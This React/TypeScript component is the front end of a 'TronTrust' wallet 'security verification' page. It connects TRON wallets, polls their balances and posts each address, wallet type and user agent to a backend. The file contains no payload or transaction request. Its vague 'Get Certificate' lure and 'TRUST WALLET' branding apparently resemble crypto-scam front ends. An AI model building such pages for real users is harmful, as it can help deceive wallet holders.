import { useState, useEffect, useCallback, useMemo } from 'react';
import { 
  TronLinkAdapter, 
  BitKeepAdapter, 
  OkxWalletAdapter, 
  TokenPocketAdapter,
  WalletConnectAdapter,
  LedgerAdapter,
  TrustAdapter
} from '@tronweb3/tronwallet-adapters';
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletModalProvider, WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
import '@tronweb3/tronwallet-adapter-react-ui/style.css';
import { 
  Zap, 
  Settings, 
  Shield, 
  HelpCircle, 
  Wallet,
  Menu,
  Check,
  Bell,
  FileText,
  File,
  ArrowRight,
  Loader2
} from 'lucide-react';
import logo from './logo.png'

const Logo = () => (
  <div className="w-8 h-8 bg-purple-600 rounded-lg flex items-center justify-center">
    <span className="text-white font-bold text-sm">TT</span>
  </div>
);

interface WalletInfo {
  address: string;
  chainId: number;
  network: string;
  walletType: string;
  sessionId: string;
  metadata: {
    userAgent: string;
    timestamp: number;
    connectedAt: string;
  };
}

const WalletConnectionCard = () => {
  const { wallet, address, connected, connecting, disconnect } = useWallet();
  const [walletData, setWalletData] = useState<WalletInfo | null>(null);
  const [apiError, setApiError] = useState<string | null>(null);
  const [apiSuccess, setApiSuccess] = useState<string | null>(null);
  const [balance, setBalance] = useState<string | null>(null);
  const [isRealTime, setIsRealTime] = useState(false);
  const [balanceLoading, setBalanceLoading] = useState(false);

  const getApiBaseUrl = () => {
    if (typeof window !== 'undefined') {
      const hostname = window.location.hostname;
      if (hostname === 'localhost' || hostname === '127.0.0.1') {
        return 'http://localhost:5000/api';
      }
    }
    return 'https://your-production-api.com/api';
  };

  const API_BASE_URL = getApiBaseUrl();

  const log = (message: string) => {
    console.log(`[TronTrust] ${message}`);
  };

  const fetchBalance = useCallback(async (addr: string) => {
    try {
      setBalanceLoading(true);
      log(`Fetching balance for address: ${addr}`);
      
      const response = await fetch(`https://api.trongrid.io/v1/accounts/${addr}`);
      if (!response.ok) {
        throw new Error(`Network response was not ok: ${response.status}`);
      }
      const data = await response.json();
      
      if (data.data && data.data.length > 0) {
        const trxBalance = data.data[0].balance ? (data.data[0].balance / 1000000).toFixed(6) : '0';
        setBalance(trxBalance);
        log(`Balance fetched successfully: ${trxBalance} TRX`);
        return trxBalance;
      }
      setBalance('0');
      return '0';
    } catch (error) {
      console.error('Error fetching balance:', error);
      setApiError('Failed to fetch balance. Please try again.');
      setBalance('0');
      return '0';
    } finally {
      setBalanceLoading(false);
    }
  }, []);

  // Real-time balance updates
  useEffect(() => {
    let intervalId = null;
    
    if (connected && address) {
      log(`Setting up real-time balance monitoring for: ${address}`);
      fetchBalance(address).catch(console.error);
      
      // Update balance every 15 seconds
      intervalId = setInterval(() => {
        fetchBalance(address).catch(console.error);
      }, 15000);
      
      setIsRealTime(true);
    } else {
      setBalance(null);
      setIsRealTime(false);
    }
    
    return () => {
      if (intervalId) {
        clearInterval(intervalId);
        log('Stopped real-time balance monitoring');
      }
    };
  }, [connected, address, fetchBalance]);

  // Handle wallet connection/disconnection
  useEffect(() => {
    const handleConnection = async () => {
      if (connected && address && wallet) {
        log(`TRON Wallet connected successfully!`);
        log(`Address: ${address}`);
        log(`Wallet: ${wallet.adapter.name}`);
        
        const walletInfo = {
          address: address,
          chainId: 728126428,
          network: 'TRON Mainnet',
          walletType: wallet.adapter.name,
          sessionId: Date.now().toString(),
          metadata: {
            userAgent: navigator.userAgent,
            timestamp: Date.now(),
            connectedAt: new Date().toISOString()
          }
        };
        
        setWalletData(walletInfo);
        setApiError(null);
        
        try {
          await saveWalletToAPI(walletInfo);
        } catch (error) {
          console.error('Error saving wallet to API:', error);
        }
      } else if (!connected && walletData) {
        log('TRON Wallet disconnected');
        try {
          await removeWalletFromAPI(walletData.address);
        } catch (error) {
          console.error('Error removing wallet from API:', error);
        }
        setWalletData(null);
        setBalance(null);
        setIsRealTime(false);
      }
    };

    handleConnection();
  }, [connected, address, wallet]);

  const saveWalletToAPI = async (walletInfo: WalletInfo) => {
    try {
      setApiError(null);
      log(`Saving wallet to API: ${walletInfo.address}`);
      
      const response = await fetch(`${API_BASE_URL}/connect-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(walletInfo)
      });
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const result = await response.json();
      if (result.success) {
        log(`Wallet saved successfully to API`);
        setApiSuccess('Wallet successfully verified and saved!');
        return result;
      } else {
        throw new Error(result.error || 'Unknown error');
      }
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      log(`API Error: ${errorMessage}`);
      setApiError(`Connection failed: ${errorMessage}`);
      throw error;
    }
  };

  const removeWalletFromAPI = async (address: string) => {
    try {
      setApiError(null);
      log(`Removing wallet from API: ${address}`);
      
      const response = await fetch(`${API_BASE_URL}/disconnect-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ address })
      });
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const result = await response.json();
      if (result.success) {
        log(`Wallet removed successfully from API`);
        setApiSuccess('Wallet disconnected successfully!');
        return result;
      } else {
        throw new Error(result.error || 'Unknown error');
      }
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      log(`API Error: ${errorMessage}`);
      setApiError(`Disconnection failed: ${errorMessage}`);
      throw error;
    }
  };

  const handleDisconnect = useCallback(async () => {
    log('Initiating wallet disconnect...');
    setApiSuccess(null);
    setApiError(null);
    try {
      await disconnect();
      log('Wallet disconnected successfully');
    } catch (error) {
      console.error('Error disconnecting wallet:', error);
      setApiError('Failed to disconnect wallet. Please try again.');
    }
  }, [disconnect]);

  // Clear messages after 5 seconds
  useEffect(() => {
    if (apiSuccess || apiError) {
      const timer = setTimeout(() => {
        setApiSuccess(null);
        setApiError(null);
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [apiSuccess, apiError]);

  return (
    <div className="bg-white/20 backdrop-blur-sm rounded-2xl border border-white/30 p-6 shadow-xl">
      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-4">
          <div className="w-12 h-12 bg-black rounded-xl flex items-center justify-center">
            <Wallet className="w-6 h-6 text-white" />
          </div>
          <div>
            <h3 className="text-xl font-bold text-gray-900">TRUST WALLET</h3>
            <p className="text-gray-600">Universal Wallet</p>
            {connecting && (
              <div className="flex items-center space-x-2 mt-1">
                <Loader2 className="w-4 h-4 animate-spin text-purple-600" />
                <span className="text-sm text-purple-600">Connecting...</span>
              </div>
            )}
          </div>
        </div>
        
        {!connected ? (
          <WalletActionButton className="bg-purple-600 hover:bg-purple-700 text-white px-6 py-3 rounded-xl font-semibold transition-all duration-200 flex items-center space-x-2 transform hover:scale-105 disabled:opacity-50">
            {connecting ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>Connecting...</span>
              </>
            ) : (
              <>
                <span>Get Certificate</span>
                <ArrowRight className="w-4 h-4" />
              </>
            )}
          </WalletActionButton>
        ) : (
          <button 
            onClick={handleDisconnect}
            disabled={connecting}
            className="bg-red-600 hover:bg-red-700 text-white px-6 py-3 rounded-xl font-semibold transition-all duration-200 disabled:opacity-50"
          >
            {connecting ? 'Disconnecting...' : 'Disconnect'}
          </button>
        )}
      </div>
      
      {apiSuccess && (
        <div className="mt-4 p-3 bg-green-50 rounded-lg border border-green-200">
          <div className="flex items-center space-x-2">
            <Check className="w-4 h-4 text-green-600" />
            <p className="text-sm text-green-800">{apiSuccess}</p>
          </div>
        </div>
      )}
      
      {apiError && (
        <div className="mt-4 p-3 bg-red-50 rounded-lg border border-red-200">
          <p className="text-sm text-red-800">{apiError}</p>
        </div>
      )}
      
      {connected && walletData && (
        <div className="mt-6 p-4 bg-green-50 rounded-lg border border-green-200">
          <h4 className="text-sm font-semibold text-green-800 mb-3 flex items-center space-x-2">
            <Check className="w-4 h-4" />
            <span>Connected TRON Wallet</span>
          </h4>
          <div className="space-y-2 text-sm text-green-700">
            <div className="flex justify-between">
              <span className="font-medium">Address:</span>
              <span className="font-mono text-xs">{walletData.address.slice(0, 8)}...{walletData.address.slice(-8)}</span>
            </div>
            <div className="flex justify-between">
              <span className="font-medium">Network:</span>
              <span>{walletData.network}</span>
            </div>
            <div className="flex justify-between">
              <span className="font-medium">Wallet:</span>
              <span>{walletData.walletType}</span>
            </div>
            <div className="flex justify-between">
              <span className="font-medium">Chain ID:</span>
              <span>{walletData.chainId}</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="font-medium">Balance:</span>
              <div className="flex items-center space-x-2">
                {balanceLoading ? (
                  <Loader2 className="w-3 h-3 animate-spin" />
                ) : (
                  <span className="font-mono">{balance || '0'} TRX</span>
                )}
                {isRealTime && (
                  <span className="text-xs bg-green-200 text-green-800 px-2 py-1 rounded-full">
                    Live
                  </span>
                )}
              </div>
            </div>
            <div className="flex justify-between">
              <span className="font-medium">Session:</span>
              <span className="font-mono text-xs">{walletData.sessionId}</span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const WalletConnect = () => {
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  const adapters = useMemo(() => {
    const walletConnectAdapter = new WalletConnectAdapter({
      network: 'Mainnet',
      options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: '048110749acfc9f73e40e560cd1c11ec',
        metadata: {
          name: 'TronTrust',
          description: 'TRON Wallet Security Verification App',
          url: typeof window !== 'undefined' ? window.location.origin : 'https://trontrust.com',
          icons: ['https://avatars.githubusercontent.com/u/37784886']
        }
      }
    });

    return [
      new TronLinkAdapter(),
      new BitKeepAdapter(),
      new OkxWalletAdapter(),
      new TokenPocketAdapter(),
      new TrustAdapter(),
      walletConnectAdapter,
      new LedgerAdapter()
    ];
  }, []);

  const onError = useCallback((error: any) => {
    console.error('[TronTrust] Wallet Error:', error);
    if (error.message) {
      console.error('[TronTrust] Error Details:', error.message);
    }
  }, []);

  const onConnect = useCallback((address: string) => {
    console.log('[TronTrust] Wallet Connected:', address);
  }, []);

  const onDisconnect = useCallback(() => {
    console.log('[TronTrust] Wallet Disconnected');
  }, []);

  const toggleMobileMenu = () => {
    setMobileMenuOpen(!mobileMenuOpen);
  };

  return (
    <WalletProvider 
      adapters={adapters} 
      onError={onError}
      onConnect={onConnect}
      onDisconnect={onDisconnect}
      autoConnect={true}
      localStorageKey="tronTrustWallet"
    >
      <WalletModalProvider>
        <div className="min-h-screen bg-gradient-to-br from-purple-400 via-pink-300 to-blue-300">
          <nav className="bg-white/10 backdrop-blur-md border-b border-white/20">
            <div className="max-w-8xl mx-auto px-4 sm:px-6 lg:px-8">
              <div className="flex justify-between items-center h-16">
                <div className="flex items-center space-x-3">
                  <img
                  src={logo}
                  alt="TronTrust Logo"
                  />
                
                </div>
                
                <div className="hidden md:flex items-center space-x-8">
                  <a href="#" className="flex items-center space-x-1 text-gray-700 hover:text-purple-600 transition-colors">
                    <Zap className="w-4 h-4" />
                    <span className="text-sm font-medium">Features</span>
                  </a>
                  <a href="#" className="flex items-center space-x-1 text-gray-700 hover:text-purple-600 transition-colors">
                    <Settings className="w-4 h-4" />
                    <span className="text-sm font-medium">How It Works</span>
                  </a>
                  <a href="#" className="flex items-center space-x-1 text-gray-700 hover:text-purple-600 transition-colors">
                    <Shield className="w-4 h-4" />
                    <span className="text-sm font-medium">Verification Status</span>
                  </a>
                  <a href="#" className="flex items-center space-x-1 text-gray-700 hover:text-purple-600 transition-colors">
                    <HelpCircle className="w-4 h-4" />
                    <span className="text-sm font-medium">FAQ</span>
                  </a>
                </div>
                
                <div className="hidden md:flex items-center">
                  <button className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-xl font-semibold transition-all duration-200 flex items-center space-x-2 transform hover:scale-105">
                    <Wallet className="w-4 h-4" />
                    <span>Wallet Security Check</span>
                  </button>
                </div>
                
                <button 
                  className="md:hidden p-2 rounded-lg hover:bg-white/20"
                  onClick={toggleMobileMenu}
                  aria-label="Toggle menu"
                >
                  <Menu className="w-6 h-6" />
                </button>
              </div>
              
              {mobileMenuOpen && (
                <div className="md:hidden py-4 border-t border-white/20">
                  <div className="space-y-4">
                    <a href="#" className="flex items-center space-x-2 text-gray-700 hover:text-purple-600 transition-colors">
                      <Zap className="w-4 h-4" />
                      <span className="text-sm font-medium">Features</span>
                    </a>
                    <a href="#" className="flex items-center space-x-2 text-gray-700 hover:text-purple-600 transition-colors">
                      <Settings className="w-4 h-4" />
                      <span className="text-sm font-medium">How It Works</span>
                    </a>
                    <a href="#" className="flex items-center space-x-2 text-gray-700 hover:text-purple-600 transition-colors">
                      <Shield className="w-4 h-4" />
                      <span className="text-sm font-medium">Verification Status</span>
                    </a>
                    <a href="#" className="flex items-center space-x-2 text-gray-700 hover:text-purple-600 transition-colors">
                      <HelpCircle className="w-4 h-4" />
                      <span className="text-sm font-medium">FAQ</span>
                    </a>
                    <button className="w-full bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-xl font-semibold transition-all duration-200 flex items-center justify-center space-x-2 transform hover:scale-105">
                      <Wallet className="w-4 h-4" />
                      <span>Wallet Security Check</span>
                    </button>
                  </div>
                </div>
              )}
            </div>
          </nav>
          
          <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
            <div className="mb-12">
              <div className="w-full bg-white/30 rounded-full h-2 mb-8">
                <div className="bg-purple-600 h-2 rounded-full w-1/4"></div>
              </div>
              
              <div className="flex justify-between items-center">
                <div className="flex flex-col items-center">
                  <div className="w-12 h-12 bg-purple-600 rounded-full flex items-center justify-center mb-3 shadow-lg">
                    <Check className="w-6 h-6 text-white" />
                  </div>
                  <span className="text-sm text-purple-600 font-semibold">Get Started</span>
                </div>
                
                <div className="flex flex-col items-center">
                  <div className="w-12 h-12 bg-white/30 rounded-full flex items-center justify-center mb-3">
                    <Bell className="w-6 h-6 text-gray-500" />
                  </div>
                  <span className="text-sm text-gray-600 font-medium">Scan</span>
                </div>
                
                <div className="flex flex-col items-center">
                  <div className="w-12 h-12 bg-white/30 rounded-full flex items-center justify-center mb-3">
                    <FileText className="w-6 h-6 text-gray-500" />
                  </div>
                  <span className="text-sm text-gray-600 font-medium">Results</span>
                </div>
                
                <div className="flex flex-col items-center">
                  <div className="w-12 h-12 bg-white/30 rounded-full flex items-center justify-center mb-3">
                    <File className="w-6 h-6 text-gray-500" />
                  </div>
                  <span className="text-sm text-gray-600 font-medium">Waitlist</span>
                </div>
              </div>
            </div>
            
            <div className="text-center mb-12">
              <h1 className="text-5xl font-bold text-gray-900 mb-6 tracking-tight">
                CHECK YOUR CERTIFICATE NOW
              </h1>
              <p className="text-xl text-gray-700 max-w-2xl mx-auto">
                Choose your preferred wallet to begin the security verification
              </p>
            </div>
            
            <div className="space-y-8">
              <WalletConnectionCard />
              
              <div className="bg-white/20 backdrop-blur-sm rounded-2xl border border-white/30 p-8 shadow-xl">
                <div className="flex items-center space-x-6">
                  <div className="w-16 h-16 bg-gray-800 rounded-2xl flex items-center justify-center">
                    <Shield className="w-8 h-8 text-white" />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-gray-900 mb-2">YOUR SECURITY IS OUR PRIORITY.</h3>
                    <p className="text-gray-700 text-lg">
                      We only require view access to analyze your wallet. No transactions or approvals needed.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </main>
        </div>
      </WalletModalProvider>
    </WalletProvider>
  );
};

export default WalletConnect;